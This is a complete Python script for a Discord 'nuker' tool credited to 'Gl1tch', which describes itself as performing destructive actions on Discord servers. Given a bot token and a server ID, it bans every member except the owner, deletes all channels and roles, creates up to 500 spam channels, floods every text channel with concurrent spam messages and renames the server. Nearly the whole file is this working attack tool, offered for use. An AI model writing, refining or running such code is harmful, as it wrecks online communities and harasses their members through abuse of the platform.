#Made by Gl1tch : https://github.com/Gl1tch404x

import os
import sys
import time
import random
import asyncio
import requests # type: ignore
import discord # type: ignore
import threading
import concurrent.futures
from discord.ext import commands # type: ignore
import colorama # type: ignore
from colorama import Fore, Style # type: ignore
from logo import display_logo

colorama.init(autoreset=True)

TOKEN = None
TOKEN_TYPE = None
GUILD_ID = None
client = None


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_colored(text, color=Fore.WHITE):
    print(f"{color}{text}{Style.RESET_ALL}")


def print_success(text):
    print(f"{Fore.MAGENTA}[+] {text}{Style.RESET_ALL}")


def print_error(text):
    print(f"{Fore.MAGENTA}[!] {text}{Style.RESET_ALL}")


def print_info(text):
    print(f"{Fore.MAGENTA}[*] {text}{Style.RESET_ALL}")


def print_menu():
    clear_screen()
    display_logo()
    print_colored("\nMain Menu:", Fore.MAGENTA)
    print_colored("1. Start Nuking", Fore.MAGENTA)
    print_colored("2. About Tool", Fore.MAGENTA)
    print_colored("3. Exit", Fore.MAGENTA)
    print("\n")


def about_tool():
    clear_screen()
    display_logo()
    print_colored("\nAbout Glitched Tools Nuker:", Fore.MAGENTA)
    print_colored("Glitched Tools Nuker is a Discord server nuking tool.", Fore.MAGENTA)
    print_colored("This tool allows you to perform various destructive actions on Discord servers using bot tokens.", Fore.MAGENTA)
    print_colored("\nFeatures:", Fore.MAGENTA)
    print_colored("- Ban all members", Fore.MAGENTA)
    print_colored("- Delete all channels", Fore.MAGENTA)
    print_colored("- Create spam channels", Fore.MAGENTA)
    print_colored("- Spam messages in all channels", Fore.MAGENTA)
    print_colored("- Change server name", Fore.MAGENTA)
    print_colored("- Delete all roles", Fore.MAGENTA)
    print_colored("- Change server icon", Fore.MAGENTA)
    
    input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")


def validate_token(token, token_type):
    if token_type == 'bot':
        headers = {
            'Authorization': f"Bot {token}",
            'Content-Type': 'application/json'
        }
    else:
        headers = {
            'Authorization': f"{token}",
            'Content-Type': 'application/json'
        }
    
    try:

        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        
        if response.status_code == 200:
            username = response.json().get('username')
            print_success(f"Token is valid! Logged in as: {username}")
            return True
        else:
            error_info = response.json() if response.content else {"message": f"Status code: {response.status_code}"}
            print_error(f"Invalid token. {error_info.get('message', '')}")
            return False
    except Exception as e:
        print_error(f"Error validating token: {str(e)}")
        return False


async def ban_all_members(guild):
    print_info("Starting to ban all members...")
    ban_count = 0
    
    try:
        async for member in guild.fetch_members(limit=None):
            if member.id != guild.me.id and member.id != guild.owner_id:
                try:
                    await member.ban(reason="ResellNuker")
                    print_success(f"Banned: {member.name}#{member.discriminator}")
                    ban_count += 1
                except Exception as e:
                    print_error(f"Failed to ban {member.name}#{member.discriminator}: {str(e)}")
    except Exception as e:
        print_error(f"Error while banning members: {str(e)}")
    
    return ban_count


async def delete_all_channels(guild):
    print_info("Starting to delete all channels...")
    deleted_count = 0
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print_success(f"Deleted channel: {channel.name}")
            deleted_count += 1
        except Exception as e:
            print_error(f"Failed to delete channel {channel.name}: {str(e)}")
    
    return deleted_count


async def create_spam_channels(guild, num_channels, channel_name):
    print_info(f"Creating {num_channels} spam channels...")
    created_count = 0
    
    for i in range(num_channels):
        try:
            name = f"{channel_name}-{i+1}" if num_channels > 1 else channel_name
            await guild.create_text_channel(name=name)
            print_success(f"Created channel: {name}")
            created_count += 1
        except Exception as e:
            print_error(f"Failed to create channel: {str(e)}")
    
    return created_count


async def change_server_name(guild, new_name):
    print_info(f"Changing server name to: {new_name}")
    
    try:
        old_name = guild.name
        await guild.edit(name=new_name)
        print_success(f"Server name changed from '{old_name}' to '{new_name}'")
        return True
    except Exception as e:
        print_error(f"Failed to change server name: {str(e)}")
        return False


async def delete_all_roles(guild):
    print_info("Starting to delete all roles...")
    deleted_count = 0
    
    for role in guild.roles:
        if role != guild.default_role and role.position < guild.me.top_role.position:
            try:
                await role.delete()
                print_success(f"Deleted role: {role.name}")
                deleted_count += 1
            except Exception as e:
                print_error(f"Failed to delete role {role.name}: {str(e)}")
    
    return deleted_count


async def send_message_to_channel(channel, message, i, num_messages):
    try:
        await channel.send(message)
        print_success(f"Sent message to {channel.name} ({i+1}/{num_messages})")
        return True
    except discord.errors.HTTPException as e:
        if e.status == 429:
            print_error(f"Rate limited on {channel.name}. Waiting to avoid ban...")
            await asyncio.sleep(5)
        else:
            print_error(f"Failed to send message to {channel.name}: {str(e)}")
        return False
    except Exception as e:
        print_error(f"Failed to send message to {channel.name}: {str(e)}")
        return False

async def spam_channels_concurrently(channels, message, num_messages):
    sent_count = 0
    all_tasks = []
    
    for i in range(num_messages):
        for channel in channels:
            task = asyncio.create_task(send_message_to_channel(channel, message, i, num_messages))
            all_tasks.append(task)
            
            if len(all_tasks) % 100 == 0:
                await asyncio.sleep(0.01)
    
    results = await asyncio.gather(*all_tasks, return_exceptions=True)
    for result in results:
        if result is True:
            sent_count += 1
    
    return sent_count

async def spam_all_channels(guild, message, num_messages):
    print_info(f"Starting high-speed spam to all channels with {num_messages} messages each...")
    
    text_channels = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]
    
    if not text_channels:
        print_error("No text channels found to spam")
        return 0
    spam_count = await spam_channels_concurrently(text_channels, message, num_messages)
    
    return spam_count


async def start_nuking():
    global TOKEN, TOKEN_TYPE, GUILD_ID, client
    
    clear_screen()
    display_logo()
    
    TOKEN_TYPE = 'bot'
    TOKEN = input(f"{Fore.MAGENTA}Enter your bot token: {Style.RESET_ALL}")

    if not validate_token(TOKEN, TOKEN_TYPE):
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")
        return

    GUILD_ID = input(f"{Fore.MAGENTA}Enter the server ID to nuke: {Style.RESET_ALL}")
    try:
        GUILD_ID = int(GUILD_ID)
    except ValueError:
        print_error("Invalid server ID. Please enter a valid number.")
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")
        return

    intents = discord.Intents.all()
    client = commands.Bot(command_prefix='!', intents=intents)

    clear_screen()
    display_logo()
    print_colored("Select nuking options (enter 'y' for yes, 'n' for no):", Fore.MAGENTA)
    
    ban_members = input(f"{Fore.MAGENTA}Ban all members? (y/n): {Style.RESET_ALL}").lower() == 'y'
    delete_channels = input(f"{Fore.MAGENTA}Delete all channels? (y/n): {Style.RESET_ALL}").lower() == 'y'
    create_channels = input(f"{Fore.MAGENTA}Create spam channels? (y/n): {Style.RESET_ALL}").lower() == 'y'
    
    num_channels = 0
    channel_name = ""
    if create_channels:
        while True:
            try:
                num_channels = int(input(f"{Fore.MAGENTA}How many channels to create? (1-500): {Style.RESET_ALL}"))
                if 1 <= num_channels <= 500:
                    break
                else:
                    print_error("Please enter a number between 1 and 500.")
            except ValueError:
                print_error("Please enter a valid number.")
        
        channel_name = input(f"{Fore.MAGENTA}Enter channel name (without numbers): {Style.RESET_ALL}")
    
    spam_channels = input(f"{Fore.MAGENTA}Spam messages in all channels? (y/n): {Style.RESET_ALL}").lower() == 'y'
    spam_message = ""
    num_spam_messages = 0
    if spam_channels:
        spam_message = input(f"{Fore.MAGENTA}Enter spam message content: {Style.RESET_ALL}")
        while True:
            try:
                num_spam_messages = int(input(f"{Fore.MAGENTA}How many messages to send per channel? (1-100): {Style.RESET_ALL}"))
                if 1 <= num_spam_messages <= 100:
                    break
                else:
                    print_error("Please enter a number between 1 and 100.")
            except ValueError:
                print_error("Please enter a valid number.")
    
    change_name = input(f"{Fore.MAGENTA}Change server name? (y/n): {Style.RESET_ALL}").lower() == 'y'
    new_server_name = ""
    if change_name:
        new_server_name = input(f"{Fore.MAGENTA}Enter new server name: {Style.RESET_ALL}")
    
    delete_roles = input(f"{Fore.MAGENTA}Delete all roles? (y/n): {Style.RESET_ALL}").lower() == 'y'
    

    clear_screen()
    display_logo()
    print_colored("You have selected the following actions:", Fore.MAGENTA)
    if ban_members:
        print_colored("- Ban all members", Fore.MAGENTA)
    if delete_channels:
        print_colored("- Delete all channels", Fore.MAGENTA)
    if create_channels:
        print_colored(f"- Create {num_channels} channels named '{channel_name}-X'", Fore.MAGENTA)
    if spam_channels:
        print_colored(f"- Send {num_spam_messages} high-speed spam messages to each channel (optimized for maximum speed)", Fore.MAGENTA)
    if change_name:
        print_colored(f"- Change server name to '{new_server_name}'", Fore.MAGENTA)
    if delete_roles:
        print_colored("- Delete all roles", Fore.MAGENTA)
    
    confirm = input(f"\n{Fore.MAGENTA}Are you sure you want to continue with these actions? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print_info("Nuking cancelled.")
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")
        return
    

    @client.event
    async def on_ready():
        print_success(f"Logged in as {client.user.name}")
        
        guild = client.get_guild(GUILD_ID)
        if not guild:
            print_error(f"Could not find server with ID {GUILD_ID}")
            await client.close()
            return
        
        print_info(f"Starting nuking process on server: {guild.name}")
        

        results = []
        
        if change_name:
            success = await change_server_name(guild, new_server_name)
            if success:
                results.append(f"Changed server name to '{new_server_name}'")
        
        if delete_roles:
            deleted = await delete_all_roles(guild)
            results.append(f"Deleted {deleted} roles")
        

        if spam_channels and not delete_channels:
            spammed = await spam_all_channels(guild, spam_message, num_spam_messages)
            results.append(f"Sent {spammed} high-speed spam messages across all channels")
        
        if delete_channels:
            deleted = await delete_all_channels(guild)
            results.append(f"Deleted {deleted} channels")
        
        if create_channels:
            created = await create_spam_channels(guild, num_channels, channel_name)
            results.append(f"Created {created} spam channels")
            

            if spam_channels:
                spammed = await spam_all_channels(guild, spam_message, num_spam_messages)
                results.append(f"Sent {spammed} high-speed spam messages across all new channels")
        elif spam_channels and delete_channels:
            print_error("Cannot spam channels: All channels were deleted")
        
        if ban_members:
            banned = await ban_all_members(guild)
            results.append(f"Banned {banned} members")
        

        print_colored("\nNuking Summary:", Fore.MAGENTA)
        for result in results:
            print_colored(f"- {result}", Fore.MAGENTA)
        
        print_colored("Nuking process completed!", Fore.MAGENTA)
        await client.close()
    

    try:
        print_info("Starting the nuking process, please wait...")
        await client.start(TOKEN)
    except discord.LoginFailure:
        print_error("Failed to login. Invalid token.")
    except Exception as e:
        print_error(f"An error occurred: {str(e)}")
    
    input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")


async def main():
    while True:
        print_menu()
        choice = input(f"{Fore.MAGENTA}Enter your choice (1-3): {Style.RESET_ALL}")
        
        if choice == '1':
            await start_nuking()
        elif choice == '2':
            about_tool()
        elif choice == '3':
            print_colored("Exiting ResellNuker. Goodbye!", Fore.MAGENTA)
            sys.exit(0)
        else:
            print_error("Invalid choice. Please try again.")
            time.sleep(1)


if __name__ == "__main__":
    asyncio.run(main())
